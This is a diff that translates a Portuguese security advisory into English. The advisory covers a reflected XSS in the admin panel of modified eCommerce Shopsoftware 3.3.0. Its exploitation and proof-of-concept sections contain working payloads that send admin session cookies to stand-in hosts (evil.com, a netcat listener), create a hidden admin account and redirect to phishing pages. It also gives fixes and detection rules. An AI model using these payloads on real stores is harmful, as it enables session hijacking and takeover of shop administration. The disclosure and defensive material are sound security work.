@@ -1,206 +1,206 @@
-# Advisory de Segurança — Reflected XSS em modified eCommerce Shopsoftware 3.3.0
+# Security Advisory — Reflected XSS in modified eCommerce Shopsoftware 3.3.0
 
-| Campo | Valor |
+| Field | Value |
 | :---- | :---- |
-| **Título** | Reflected Cross-Site Scripting (XSS) em `admin/paypal_webhook.php` |
-| **Produto** | modified eCommerce Shopsoftware |
-| **Versão Afetada** | 3.3.0 (rev. r16825) — última versão disponível |
-| **Componente** | `admin/paypal_webhook.php` — parâmetro GET `id` em `action=edit` |
-| **Tipo** | Reflected Cross-Site Scripting (XSS) |
+| **Title** | Reflected Cross-Site Scripting (XSS) in `admin/paypal_webhook.php` |
+| **Product** | modified eCommerce Shopsoftware |
+| **Affected Version** | 3.3.0 (rev. r16825) — latest available version |
+| **Component** | `admin/paypal_webhook.php` — GET parameter `id` on `action=edit` |
+| **Type** | Reflected Cross-Site Scripting (XSS) |
 | **CWE** | [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation |
 | **CAPEC** | [CAPEC-86](https://capec.mitre.org/data/definitions/86.html) — XSS via HTTP Query Strings |
-| **CVSS 3.1 Score** | **6.1 (Medium)** — escalável a **8.7 (High)** em cenário de phishing direcionado |
-| **Vector Base** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
-| **Vector Escalado** | `CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C` |
-| **CVE ID** | Pendente de Atribuição |
-| **Descoberto por** | Carlos Augusto Adriano Filho |
-| **Data de Descoberta** | 12 de Novembro de 2026 |
-| **Data de Publicação** | 12 de Novembro de 2026 |
-| **Versão Advisory** | 1.0 |
+| **CVSS 3.1 Score** | **6.1 (Medium)** — escalatable to **8.7 (High)** in targeted phishing scenario |
+| **Base Vector** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` |
+| **Escalated Vector** | `CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C` |
+| **CVE ID** | Pending Assignment |
+| **Discovered by** | Carlos Augusto Adriano Filho |
+| **Discovery Date** | November 12, 2026 |
+| **Publication Date** | November 12, 2026 |
+| **Advisory Version** | 1.0 |
 
 ---
 
-## Sumário
+## Table of Contents
 
-1. [Resumo Executivo](#1-resumo-executivo)  
-2. [Produto e Versão Afetada](#2-produto-e-versão-afetada)  
-3. [Descrição Técnica](#3-descrição-técnica)  
-4. [Impacto](#4-impacto)  
-5. [Classificação CVSS 3.1 e CWE](#5-classificação-cvss-31-e-cwe)  
-6. [Cenário de Exploração](#6-cenário-de-exploração)  
-7. [Evidência Técnica](#7-evidência-técnica)  
-8. [Prova de Conceito (PoC)](#8-prova-de-conceito-poc)  
-9. [Passos de Reprodução](#9-passos-de-reprodução)  
-10. [Mitigações Recomendadas](#10-mitigações-recomendadas)  
-11. [Código de Correção](#11-código-de-correção)  
-12. [Detecção e Monitoramento](#12-detecção-e-monitoramento)  
-13. [Timeline de Responsible Disclosure](#13-timeline-de-responsible-disclosure)  
-14. [Comunicação com o Vendor](#14-comunicação-com-o-vendor)  
-15. [Créditos](#15-créditos)  
-16. [Referências](#16-referências)  
-17. [Histórico de Revisões](#17-histórico-de-revisões)  
-18. [Aviso Legal](#18-aviso-legal)
-
----
-
-## 1\. Resumo Executivo
-
-Uma vulnerabilidade de **Reflected Cross-Site Scripting (XSS)** foi identificada no painel administrativo do **modified eCommerce Shopsoftware 3.3.0**, especificamente no endpoint `GET /admin/paypal_webhook.php?action=edit&id=`.
-
-O parâmetro **`id`** é refletido diretamente no HTML da resposta sem qualquer codificação ou sanitização, permitindo a injeção de JavaScript arbitrário no contexto do navegador da vítima. Um atacante pode explorar esta falha para **roubar sessões de administradores, realizar ações em nome da vítima (CSRF-bypass) ou redirecionar para páginas maliciosas**.
-
-O CVSS 3.1 base calculado é **6.1 (Medium)**, escalável a **8.7 (High)** em cenário de ataque direcionado com phishing contra administradores autenticados.
+1. [Executive Summary](#1-executive-summary)  
+2. [Affected Product and Version](#2-affected-product-and-version)  
+3. [Technical Description](#3-technical-description)  
+4. [Impact](#4-impact)  
+5. [CVSS 3.1 and CWE Classification](#5-cvss-31-and-cwe-classification)  
+6. [Exploitation Scenario](#6-exploitation-scenario)  
+7. [Technical Evidence](#7-technical-evidence)  
+8. [Proof of Concept (PoC)](#8-proof-of-concept-poc)  
+9. [Reproduction Steps](#9-reproduction-steps)  
+10. [Recommended Mitigations](#10-recommended-mitigations)  
+11. [Fix Code](#11-fix-code)  
+12. [Detection and Monitoring](#12-detection-and-monitoring)  
+13. [Responsible Disclosure Timeline](#13-responsible-disclosure-timeline)  
+14. [Vendor Communication](#14-vendor-communication)  
+15. [Credits](#15-credits)  
+16. [References](#16-references)  
+17. [Revision History](#17-revision-history)  
+18. [Legal Disclaimer](#18-legal-disclaimer)
 
 ---
 
-## 2\. Produto e Versão Afetada
+## 1\. Executive Summary
 
-| Campo | Detalhe |
+A **Reflected Cross-Site Scripting (XSS)** vulnerability was identified in the administrative panel of **modified eCommerce Shopsoftware 3.3.0**, specifically at the endpoint `GET /admin/paypal_webhook.php?action=edit&id=`.
+
+The **`id`** parameter is reflected directly into the HTML response without any encoding or sanitization, allowing injection of arbitrary JavaScript in the victim's browser context. An attacker can exploit this flaw to **steal administrator sessions, perform actions on behalf of the victim (CSRF-bypass), or redirect to malicious pages**.
+
+The calculated CVSS 3.1 base score is **6.1 (Medium)**, escalatable to **8.7 (High)** in a targeted spear phishing attack against authenticated administrators.
+
+---
+
+## 2\. Affected Product and Version
+
+| Field | Detail |
 | :---- | :---- |
-| **Produto** | modified eCommerce Shopsoftware (modified-shop) |
-| **Versão** | 3.3.0 — revisão r16825 (última versão pública disponível) |
-| **Linguagem** | PHP 8.1.x |
-| **Servidor Web** | Apache 2.4.x |
-| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
-| **Arquivo Vulnerável** | `admin/paypal_webhook.php` |
-| **Parâmetro Vulnerável** | `id` (via método GET, action=edit) |
-| **Versão Corrigida** | ⚠️ Nenhuma — sem patch disponível na data deste advisory |
+| **Product** | modified eCommerce Shopsoftware (modified-shop) |
+| **Version** | 3.3.0 — revision r16825 (latest publicly available version) |
+| **Language** | PHP 8.1.x |
+| **Web Server** | Apache 2.4.x |
+| **Repository** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
+| **Vulnerable File** | `admin/paypal_webhook.php` |
+| **Vulnerable Parameter** | `id` (via GET method, action=edit) |
+| **Fixed Version** | ⚠️ None — no patch available as of this advisory's publication date |
 
 ---
 
-## 3\. Descrição Técnica
+## 3\. Technical Description
 
-O endpoint `admin/paypal_webhook.php` processa notificações do PayPal (IPN — Instant Payment Notification) e também expõe um formulário de edição acessível via `?action=edit`. Neste modo, o parâmetro `id` é lido de `$_GET` e refletido **sem codificação** diretamente no valor de um campo `<input type="hidden">` via a função `xtc_draw_hidden_field()`.
+The endpoint `admin/paypal_webhook.php` processes PayPal notifications (IPN — Instant Payment Notification) and also exposes an edit form accessible via `?action=edit`. In this mode, the `id` parameter is read from `$_GET` and reflected **without encoding** directly into an `<input type="hidden">` field value via the `xtc_draw_hidden_field()` function.
 
-### Fluxo do Dado Vulnerável
+### Vulnerable Data Flow
 
 ```
 GET /admin/paypal_webhook.php?action=edit&id=<PAYLOAD>
                                                ↓
-              $webhook_id = $_GET['id']   (sem sanitização)
+              $webhook_id = $_GET['id']   (no sanitization)
                                                ↓
   echo xtc_draw_hidden_field('config[id]', $_GET['id'])
                                                ↓
   <input type="hidden" name="config[id]" value="<PAYLOAD>">
                                                ↓
-                    XSS executado no navegador da vítima
+                    XSS executed in victim's browser
 ```
 
-### Código Vulnerável
+### Vulnerable Code
 
 ```php
-// admin/paypal_webhook.php — linha ~168 (modo action=edit)
-// $_GET['id'] refletido sem htmlspecialchars() ou qualquer codificação
+// admin/paypal_webhook.php — line ~168 (action=edit mode)
+// $_GET['id'] reflected without htmlspecialchars() or any encoding
 
 echo xtc_draw_hidden_field('config[id]', $_GET['id']);
 //                                        ^^^^^^^^^^
-//                                        SEM SANITIZAÇÃO
+//                                        NO SANITIZATION
 ```
 
-A função `xtc_draw_hidden_field()` gera diretamente:
+The `xtc_draw_hidden_field()` function generates directly:
 
 ```html
-<input type="hidden" name="config[id]" value="VALOR_DE_$_GET['id']">
+<input type="hidden" name="config[id]" value="VALUE_OF_$_GET['id']">
 ```
 
-Ao injetar `"><script>alert(document.domain)</script>`, o campo gerado se torna:
+By injecting `"><script>alert(document.domain)</script>`, the generated field becomes:
 
 ```html
 <input type="hidden" name="config[id]" value=""><script>alert(document.domain)</script>">
 ```
 
-O script é executado imediatamente pelo navegador no domínio da aplicação.
+The script is immediately executed by the browser within the application's domain.
 
 ---
 
-## 4\. Impacto
+## 4\. Impact
 
-| Dimensão | Nível | Descrição |
+| Dimension | Level | Description |
 | :---- | :---- | :---- |
-| **Confidencialidade** | 🟡 Low → 🔴 High\* | Roubo do cookie `MODsid` (sessão admin) via `document.cookie` |
-| **Integridade** | 🟡 Low → 🔴 High\* | Ações arbitrárias no painel em nome do admin autenticado |
-| **Disponibilidade** | ⚪ None | Sem impacto direto na disponibilidade |
+| **Confidentiality** | 🟡 Low → 🔴 High\* | Theft of `MODsid` session cookie via `document.cookie` |
+| **Integrity** | 🟡 Low → 🔴 High\* | Arbitrary actions in the admin panel on behalf of the authenticated victim |
+| **Availability** | ⚪ None | No direct impact on availability |
 
-> \*Impacto escalado em cenário com phishing direcionado (spear phishing) contra administradores.
+> \*Impact escalated in a scenario involving targeted spear phishing against administrators.
 
-### Vetores de Ataque Pós-XSS
+### Post-XSS Attack Vectors
 
-- **Session Hijacking** — Extração do cookie `MODsid` via `document.cookie` para sequestro de sessão  
-- **Admin Action Forgery** — Execução de requisições autenticadas (criar usuário admin, alterar configurações, modificar preços) no contexto da sessão da vítima  
-- **Credential Harvesting** — Injeção de formulário falso de reautenticação para captura de credenciais  
-- **Redirecionamento Malicioso** — `window.location` para página de phishing  
-- **Keylogging** — Captura de teclado no painel administrativo  
-- **Exploitation Chaining** — Combinação com outras vulnerabilidades (CSRF, SSRF) para escalonamento de impacto
+- **Session Hijacking** — Extraction of the `MODsid` cookie via `document.cookie` to hijack the admin session  
+- **Admin Action Forgery** — Execution of authenticated requests (create admin user, modify settings, change prices) in the context of the victim's session  
+- **Credential Harvesting** — Injection of a fake re-authentication form to capture credentials  
+- **Malicious Redirect** — `window.location` pointing to a phishing page  
+- **Keylogging** — Keyboard capture within the administrative panel  
+- **Vulnerability Chaining** — Combining with other vulnerabilities (CSRF, SSRF) for impact escalation
 
 ---
 
-## 5\. Classificação CVSS 3.1 e CWE
+## 5\. CVSS 3.1 and CWE Classification
 
-### Score Base: `6.1 (Medium)`
+### Base Score: `6.1 (Medium)`
 
 ```
 CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
 ```
 
-| Métrica | Valor | Justificativa |
+| Metric | Value | Rationale |
 | :---- | :---- | :---- |
-| **Attack Vector (AV)** | Network | Exploração via link enviado por qualquer vetor |
-| **Attack Complexity (AC)** | Low | Sem condições especiais — link direto |
-| **Privileges Required (PR)** | None | O atacante não precisa de conta para craftar o link |
-| **User Interaction (UI)** | Required | A vítima (admin) precisa clicar no link malicioso |
-| **Scope (S)** | Changed | O script executa no contexto do browser da vítima |
-| **Confidentiality (C)** | Low | Acesso limitado a dados do contexto da sessão |
-| **Integrity (I)** | Low | Modificações limitadas no contexto do DOM |
-| **Availability (A)** | None | Sem impacto direto |
+| **Attack Vector (AV)** | Network | Exploitation via link sent through any vector |
+| **Attack Complexity (AC)** | Low | No special conditions — direct link |
+| **Privileges Required (PR)** | None | The attacker does not need an account to craft the link |
+| **User Interaction (UI)** | Required | The victim (admin) must click the malicious link |
+| **Scope (S)** | Changed | The script executes in the victim's browser context |
+| **Confidentiality (C)** | Low | Access limited to data within the session context |
+| **Integrity (I)** | Low | Limited DOM context modifications |
+| **Availability (A)** | None | No direct impact |
 
-### Score Escalado (Spear Phishing Admin): `8.7 (High)`
+### Escalated Score (Admin Spear Phishing): `8.7 (High)`
 
 ```
 CVSS:3.1/AV:A/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H/E:F/RC:C
 ```
 
-> Em cenário onde o atacante já possui acesso à rede interna e é autenticado como admin, o impacto é máximo (C:H/I:H/A:H) com scope changed, exploit funcional (E:F) e confirmado (RC:C).
+> In a scenario where the attacker already has access to the internal network and is authenticated as an admin, the impact is maximum (C:H/I:H/A:H) with changed scope, functional exploit (E:F) and confirmed (RC:C).
 
 **CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralization of Input During Web Page Generation (XSS)  
 **CAPEC:** [CAPEC-86](https://capec.mitre.org/data/definitions/86.html) — XSS via HTTP Query Strings
 
-> **Calculadora (Base):** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
+> **Calculator (Base):** [https\://www\.first.org/cvss/calculator/3.1\#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)
 
 ---
 
-## 6\. Cenário de Exploração
+## 6\. Exploitation Scenario
 
 ```
-[ Atacante ] → Crafta URL maliciosa com payload XSS
+[ Attacker ] → Crafts malicious URL with XSS payload
                     ↓
    http://[TARGET]/admin/paypal_webhook.php
      ?action=edit
      &id="><script>fetch('https://evil.com/?c='+document.cookie)</script>
 
-[ Vítima: Admin autenticado ]
+[ Victim: Authenticated Admin ]
         ↓
-   Recebe link via e-mail, Slack, ticket de suporte, etc.
+   Receives link via e-mail, Slack, support ticket, etc.
         ↓
-   Clica no link enquanto autenticado no painel admin
+   Clicks the link while authenticated in the admin panel
         ↓
-   Browser executa o script no domínio da aplicação
+   Browser executes the script within the application's domain
         ↓
-   Cookie MODsid enviado para servidor do atacante
+   MODsid cookie sent to attacker's server
         ↓
-[ Atacante ] → Usa MODsid para sequestrar sessão admin
+[ Attacker ] → Uses MODsid to hijack admin session
         ↓
-   Acesso total ao painel: produtos, pedidos, clientes, configurações
+   Full access to admin panel: products, orders, customers, settings
 ```
 
-### Variantes de Exploração
+### Exploitation Variants
 
-**Roubo de sessão (exfiltração de cookie):**
+**Session theft (cookie exfiltration):**
 
 ```
 ?action=edit&id="><script>new Image().src='https://evil.com/?c='+document.cookie</script>
 ```
 
-**Criação silenciosa de usuário admin (combinado com CSRF):**
+**Silent admin user creation (combined with CSRF):**
 
 ```
 ?action=edit&id="><script>
@@ -210,7 +210,7 @@ fetch('/admin/create_account.php',{method:'POST',
 </script>
 ```
 
-**Redirecionamento para phishing:**
+**Redirect to phishing:**
 
 ```
 ?action=edit&id="><script>window.location='https://evil.com/fake-admin-login'</script>
@@ -218,22 +218,22 @@ fetch('/admin/create_account.php',{method:'POST',
 
 ---
 
-## 7\. Evidência Técnica
+## 7\. Technical Evidence
 
-| Campo | Valor Confirmado |
+| Field | Confirmed Value |
 | :---- | :---- |
-| **URL Alvo** | `http://[TARGET]/admin/paypal_webhook.php?action=edit&id=` |
-| **Método** | `GET` |
-| **Parâmetro Vulnerável** | `id` |
-| **Contexto de Reflexão** | Atributo `value` de `<input type="hidden">` |
-| **Função Responsável** | `xtc_draw_hidden_field('config[id]', $_GET['id'])` |
+| **Target URL** | `http://[TARGET]/admin/paypal_webhook.php?action=edit&id=` |
+| **Method** | `GET` |
+| **Vulnerable Parameter** | `id` |
+| **Reflection Context** | `value` attribute of `<input type="hidden">` |
+| **Responsible Function** | `xtc_draw_hidden_field('config[id]', $_GET['id'])` |
 | **PHP** | 8.1.34 |
 | **Apache** | 2.4.65 |
-| **Payload Confirmado** | `"><script>alert(document.domain)</script>` |
-| **Output Confirmado** | `alert(192.168.0.105)` ✅ |
-| **Requisito de Autenticação** | Sim — sessão admin ativa (`MODsid`) |
+| **Confirmed Payload** | `"><script>alert(document.domain)</script>` |
+| **Confirmed Output** | `alert(192.168.0.105)` ✅ |
+| **Authentication Requirement** | Yes — active admin session (`MODsid`) |
 
-### Requisição HTTP (PoC confirmado)
+### HTTP Request (Confirmed PoC)
 
 ```
 GET /admin/paypal_webhook.php?action=edit&id=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E HTTP/1.1
@@ -241,59 +241,59 @@ Host: 192.168.0.105:8080
 Cookie: MODsid=<SESSION_COOKIE>
 ```
 
-### Trecho do HTML Gerado (Resposta Vulnerável)
+### Generated HTML Snippet (Vulnerable Response)
 
 ```html
-<!-- Gerado por xtc_draw_hidden_field() sem sanitização -->
+<!-- Generated by xtc_draw_hidden_field() without sanitization -->
 <input type="hidden" name="config[id]"
   value=""><script>alert(document.domain)</script>">
 ```
 
 ---
 
-## 8\. Prova de Conceito (PoC)
+## 8\. Proof of Concept (PoC)
 
-> ⚠️ **Uso exclusivo em ambientes autorizados. Testes em produção sem autorização são ilegais.**
+> ⚠️ **For use in authorized environments only. Testing on production systems without authorization is illegal.**
 
-### 8.1 — Teste via Browser (Confirmação Básica)
+### 8.1 — Browser Test (Basic Confirmation)
 
-Acessar a URL abaixo enquanto autenticado no painel admin. Um `alert()` com o domínio da aplicação deve ser exibido:
+Access the URL below while authenticated in the admin panel. An `alert()` displaying the application's domain should appear:
 
 ```
 http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>alert(document.domain)</script>
 ```
 
-### 8.2 — Exfiltração de Cookie via curl
+### 8.2 — Cookie Exfiltration via curl
 
 ```sh
-# 1. Preparar servidor de coleta (atacante)
+# 1. Set up collection server (attacker side)
 nc -lvnp 8888
 
-# 2. Enviar link para a vítima (admin autenticado):
+# 2. Send the following link to the victim (authenticated admin):
 http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>
 new Image().src='http://[ATTACKER]:8888/?c='+encodeURIComponent(document.cookie)
 </script>
 
-# 3. Cookie MODsid será recebido no netcat:
+# 3. MODsid cookie will be received by netcat:
 # GET /?c=MODsid%3D13e2c3e504a610032f4ef95fc792835a HTTP/1.1
 ```
 
-### 8.3 — Teste com curl (verificação de reflexão)
+### 8.3 — Reflection Test via curl
 
 ```sh
-# Verifica se o payload aparece na resposta sem codificação
+# Checks whether the payload appears in the response without encoding
 curl -s \
   'http://[TARGET]/admin/paypal_webhook.php?action=edit&id=XSSTEST' \
   -H 'Cookie: MODsid=<SESSION_COOKIE>' \
   | grep -o 'XSSTEST'
 
-# Resultado esperado: XSSTEST (confirmando reflexão sem encode)
+# Expected result: XSSTEST (confirming reflection without encoding)
 ```
 
-### 8.4 — Payload Avançado (Session Hijack \+ Redirect)
+### 8.4 — Advanced Payload (Session Hijack \+ Redirect)
 
 ```js
-// Payload completo: exfiltra cookie E redireciona para phishing
+// Full payload: exfiltrates cookie AND redirects to phishing
 "><script>
 (function(){
   var c = document.cookie;
@@ -308,61 +308,61 @@ curl -s \
 
 ---
 
-## 9\. Passos de Reprodução
+## 9\. Reproduction Steps
 
-**Pré-requisitos:** Conta de administrador válida no painel. Browser com sessão ativa (cookie `MODsid`).
+**Prerequisites:** Valid administrator account in the panel. Active browser session (cookie `MODsid`).
 
-1. **Login** — Acessar `http://[TARGET]/admin/` → preencher credenciais → confirmar autenticação.  
+1. **Login** — Access `http://[TARGET]/admin/` → fill in credentials → confirm authentication.  
      
-2. **Construir o Payload** — Criar a URL com o parâmetro `id` contendo o payload XSS:
+2. **Build the Payload** — Create the URL with the `id` parameter containing the XSS payload:
 
 ```
 http://[TARGET]/admin/paypal_webhook.php?action=edit&id="><script>alert(document.domain)</script>
 ```
 
-3. **Acessar a URL** — Colar a URL no browser enquanto autenticado. O JavaScript será executado imediatamente.  
+3. **Access the URL** — Paste the URL into the browser while authenticated. The JavaScript will be executed immediately.  
      
-4. **Confirmar Execução** — O `alert()` exibirá o domínio da aplicação (ex: `192.168.0.105`), confirmando execução de código no contexto do browser.  
+4. **Confirm Execution** — The `alert()` will display the application's domain (e.g., `192.168.0.105`), confirming code execution in the browser context.  
      
-5. **Validar Exfiltração** — Para testar roubo de cookie, substituir o payload pelo de exfiltração (Seção 8.2) e monitorar o servidor de coleta.
+5. **Validate Exfiltration** — To test cookie theft, replace the payload with the exfiltration one (Section 8.2) and monitor the collection server.
 
 ---
 
-## 10\. Mitigações Recomendadas
+## 10\. Recommended Mitigations
 
-### Correção Imediata
+### Immediate Fix
 
-| Prioridade | Ação |
+| Priority | Action |
 | :---- | :---- |
-| 🔴 **Crítica** | Aplicar `htmlspecialchars()` em **todos** os parâmetros GET/POST refletidos |
-| 🔴 **Crítica** | Validar e sanitizar `$_GET['id']` antes de qualquer uso em output |
-| 🟠 **Alta** | Implementar Content Security Policy (CSP) no painel admin |
-| 🟠 **Alta** | Adicionar flag `HttpOnly` e `SameSite=Strict` ao cookie `MODsid` |
-| 🟡 **Média** | Auditoria completa de todos os parâmetros refletidos no painel admin |
+| 🔴 **Critical** | Apply `htmlspecialchars()` to **all** reflected GET/POST parameters |
+| 🔴 **Critical** | Validate and sanitize `$_GET['id']` before any output use |
+| 🟠 **High** | Implement Content Security Policy (CSP) in the admin panel |
+| 🟠 **High** | Add `HttpOnly` and `SameSite=Strict` flags to the `MODsid` cookie |
+| 🟡 **Medium** | Full audit of all reflected parameters in the admin panel |
 
-### Recomendações Blue Team / DevSecOps
+### Blue Team / DevSecOps Recommendations
 
-- **Output Encoding** — Aplicar `htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8')` em **toda** saída de variáveis no HTML, independente da origem.  
-- **Content Security Policy (CSP)** — Implementar header `Content-Security-Policy: default-src 'self'; script-src 'self'` para bloquear scripts inline e externos não autorizados.  
-- **Cookie Security** — Adicionar atributos `HttpOnly` (impede acesso via JavaScript) e `SameSite=Strict` ao cookie de sessão `MODsid`.  
-- **Validação de Input** — Validar o formato esperado do parâmetro `id` (numérico ou UUID) e rejeitar valores que não atendam o padrão.  
-- **SAST** — Executar análise estática (PHP\_CodeSniffer \+ PHPCS-Security-Audit) em todos os arquivos que refletem `$_GET/$_POST/$_REQUEST` no HTML.  
-- **Treinamento Anti-Phishing** — Treinar administradores para não clicar em links do painel recebidos por e-mail ou mensagens não solicitadas.
+- **Output Encoding** — Apply `htmlspecialchars($value, ENT_QUOTES | ENT_HTML5, 'UTF-8')` to **all** variable output in HTML, regardless of its origin.  
+- **Content Security Policy (CSP)** — Implement the header `Content-Security-Policy: default-src 'self'; script-src 'self'` to block unauthorized inline and external scripts.  
+- **Cookie Security** — Add `HttpOnly` (prevents JavaScript access) and `SameSite=Strict` attributes to the `MODsid` session cookie.  
+- **Input Validation** — Validate the expected format of the `id` parameter (numeric or UUID) and reject values that do not match the expected pattern.  
+- **SAST** — Run static analysis (PHP\_CodeSniffer \+ PHPCS-Security-Audit) on all files reflecting `$_GET/$_POST/$_REQUEST` into HTML.  
+- **Anti-Phishing Training** — Train administrators not to click on admin panel links received via unsolicited e-mail or messages.
 
 ---
 
-## 11\. Código de Correção
+## 11\. Fix Code
 
 ```php
 // ──────────────────────────────────────────────────────────────
-// VULNERÁVEL — admin/paypal_webhook.php (~linha 168)
+// VULNERABLE — admin/paypal_webhook.php (~line 168)
 // ──────────────────────────────────────────────────────────────
 echo xtc_draw_hidden_field('config[id]', $_GET['id']);
 //                                        ^^^^^^^^^^
-//                                        refletido SEM encode
+//                                        reflected WITHOUT encoding
 
 // ──────────────────────────────────────────────────────────────
-// CORRIGIDO — Opção 1: htmlspecialchars direto no parâmetro
+// FIXED — Option 1: htmlspecialchars directly on the parameter
 // ──────────────────────────────────────────────────────────────
 echo xtc_draw_hidden_field(
     'config[id]',
@@ -370,12 +370,12 @@ echo xtc_draw_hidden_field(
 );
 
 // ──────────────────────────────────────────────────────────────
-// CORRIGIDO — Opção 2: sanitização com validação de tipo
+// FIXED — Option 2: sanitization with type validation
 // ──────────────────────────────────────────────────────────────
 $webhook_id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
 
 if ($webhook_id === false || $webhook_id === null) {
-    // ID inválido: rejeitar e logar tentativa
+    // Invalid ID: reject and log the attempt
     error_log('[SECURITY] XSS attempt on paypal_webhook.php from ' . $_SERVER['REMOTE_ADDR']);
     http_response_code(400);
     exit('Invalid webhook ID.');
@@ -384,8 +384,8 @@ if ($webhook_id === false || $webhook_id === null) {
 echo xtc_draw_hidden_field('config[id]', (int) $webhook_id);
 
 // ──────────────────────────────────────────────────────────────
-// CORRIGIDO — Opção 3: correção na função xtc_draw_hidden_field()
-// (correção central — protege todos os campos hidden do sistema)
+// FIXED — Option 3: fix in the xtc_draw_hidden_field() function
+// (central fix — protects all hidden fields system-wide)
 // ──────────────────────────────────────────────────────────────
 function xtc_draw_hidden_field(string $name, $value, string $params = ''): string {
     return '<input type="hidden" name="'
@@ -397,10 +397,10 @@ function xtc_draw_hidden_field(string $name, $value, string $params = ''): strin
 }
 ```
 
-### Content Security Policy (Recomendado)
+### Content Security Policy (Recommended)
 
 ```
-# Apache — adicionar ao VirtualHost ou .htaccess do painel admin
+# Apache — add to VirtualHost or admin panel .htaccess
 <Location /admin/>
     Header always set Content-Security-Policy \
         "default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'self';"
@@ -409,37 +409,37 @@ function xtc_draw_hidden_field(string $name, $value, string $params = ''): strin
 </Location>
 ```
 
-### Cookie Security (Recomendado)
+### Cookie Security (Recommended)
 
 ```php
-// Na inicialização da sessão do painel admin
+// At admin panel session initialization
 session_set_cookie_params([
     'lifetime' => 0,
     'path'     => '/admin/',
-    'secure'   => true,         // HTTPS obrigatório
-    'httponly' => true,         // bloqueia document.cookie
-    'samesite' => 'Strict',     // bloqueia CSRF cross-site
+    'secure'   => true,         // requires HTTPS
+    'httponly' => true,         // blocks document.cookie
+    'samesite' => 'Strict',     // blocks cross-site CSRF
 ]);
 session_start();
 ```
 
 ---
 
-## 12\. Detecção e Monitoramento
+## 12\. Detection and Monitoring
 
-### 12.1 — Padrões no Access Log Apache
+### 12.1 — Apache Access Log Patterns
 
 ```sh
-# Detectar payloads XSS típicos nos logs
+# Detect common XSS payloads in logs
 grep -iE "(<script|javascript:|onerror=|onload=|alert\(|document\.cookie)" \
      /var/log/apache2/access.log
 
-# Filtrar acessos ao endpoint vulnerável com parâmetros suspeitos
+# Filter accesses to the vulnerable endpoint with suspicious parameters
 grep 'paypal_webhook.php' /var/log/apache2/access.log | \
   grep -iE "id=.*(%3C|%22|%27|<|>|\"|\047)"
 ```
 
-### 12.2 — Regra Suricata IDS
+### 12.2 — Suricata IDS Rule
 
 ```
 alert http $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS (
@@ -466,58 +466,58 @@ SecRule REQUEST_URI "@contains /admin/paypal_webhook.php" \
         SecRule ARGS_GET:id "@detectXSS" ""
 ```
 
-### 12.4 — Monitoramento de Cookie Exfiltration (SIEM)
+### 12.4 — Cookie Exfiltration Monitoring (SIEM)
 
 ```
-# Regra para detectar exfiltração de cookies via parâmetros GET externos
+# Rule to detect cookie exfiltration via external GET parameters
 # (Wazuh / Elastic SIEM)
-Detectar requests saindo do browser do admin para domínios externos
-com parâmetros contendo strings similares a 'MODsid' ou 'session='
-em referer de /admin/paypal_webhook.php
+Detect outbound requests from admin browser to external domains
+with parameters containing strings similar to 'MODsid' or 'session='
+where referer is /admin/paypal_webhook.php
 ```
 
 ---
 
-## 13\. Timeline de Responsible Disclosure
+## 13\. Responsible Disclosure Timeline
 
-| Data | Evento |
+| Date | Event |
 | :---- | :---- |
-| `2026-11-12` | Descoberta da vulnerabilidade durante análise de código-fonte — ambiente de laboratório controlado |
-| `2026-11-12` | Confirmação via browser: `alert(document.domain)` \= `192.168.0.105` ✅ |
-| `2026-11-12` | Redação e publicação do Advisory de Segurança versão 1.0 |
-| `2026-11-12` | Notificação ao maintainer via GitHub Security Advisory / Issue |
-| `Pendente` | Aguardando resposta do vendor para coordenar publicação de patch |
-| `Pendente` | Solicitação de CVE ID em andamento via MITRE/NVD |
-| `TBD` | Publicação de patch pelo vendor (data a ser definida após coordenação) |
+| `2026-11-12` | Vulnerability discovered during source code analysis — controlled lab environment |
+| `2026-11-12` | Confirmed via browser: `alert(document.domain)` \= `192.168.0.105` ✅ |
+| `2026-11-12` | Security Advisory version 1.0 written and published |
+| `2026-11-12` | Vendor notified via GitHub Security Advisory / Issue |
+| `Pending` | Awaiting vendor response to coordinate patch publication |
+| `Pending` | CVE ID request in progress via MITRE/NVD |
+| `TBD` | Vendor patch publication (date to be defined after coordination) |
 
-> Este advisory segue o processo de **Coordinated Vulnerability Disclosure (CVD)** conforme recomendado pelo CERT/CC e ISO/IEC 29147:2018.
+> This advisory follows the **Coordinated Vulnerability Disclosure (CVD)** process as recommended by CERT/CC and ISO/IEC 29147:2018.
 
 ---
 
-## 14\. Comunicação com o Vendor
+## 14\. Vendor Communication
 
-| Campo | Detalhe |
+| Field | Detail |
 | :---- | :---- |
 | **Vendor** | modified eCommerce Shopsoftware Community |
-| **Repositório** | [https\://github.com/modified-shop/modified-shop](https://github.com/modified-shop/modified-shop) |
-| **Canal de Contato** | GitHub Security Advisories / Issues |
-| **Status** | Notificação enviada em 2026-11-12. Aguardando resposta. |
-| **SLA** | 90 dias para publicação coordenada (CVD Best Practices) |
